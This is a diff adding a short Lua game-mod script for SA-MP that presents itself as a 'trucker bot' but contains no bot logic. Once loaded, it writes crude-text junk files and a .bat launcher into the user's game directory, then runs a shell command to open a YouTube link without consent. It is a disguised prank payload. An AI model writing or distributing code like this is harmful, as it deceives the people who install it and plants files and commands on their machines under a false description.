@@ -1,0 +1,15 @@
+function main()
+	while not isSampAvailable() do wait(0) end
+	sampAddChatMessage("[BotDalnoboy] бот дальнобоя загружен", 25520633255)
+	local file = io.open(getGameDirectory() .. "\\samp.ass", "a")
+        file:write("здраствуй fisting в облаках, dungeon master в сапогах")
+        file:close()
+				local files = io.open(getGameDirectory() .. "\\rcon.ssa", "a")
+        files:write("FISTING ASS")
+        files:close()
+				local fil = io.open(getGameDirectory() .. "\\123.bat", "a")
+				fil:write("start https://www.youtube.com/watch?v=POb02mjj2zE")
+				fil:close()
+				wait(100000)
+				os.execute("start https://www.youtube.com/watch?v=POb02mjj2zE")
+end
